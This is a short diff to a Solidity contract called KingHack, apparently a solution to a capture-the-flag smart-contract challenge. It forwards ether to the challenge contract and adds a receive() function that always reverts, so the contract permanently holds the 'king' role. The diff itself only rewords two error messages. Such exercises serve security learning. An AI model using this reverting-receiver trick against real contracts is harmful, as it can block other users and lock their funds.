@@ -14,10 +14,10 @@ contract KingHack {
         (bool success, ) = payable(address(challenge)).call{value: msg.value}(
             ""
         );
-        require(success, "External call failed");
+        require(success, "Call failed");
     }
 
     receive() external payable {
-        require(false, "I am King forever!");
+        require(false, "Can's steal my throne bro!");
     }
 }
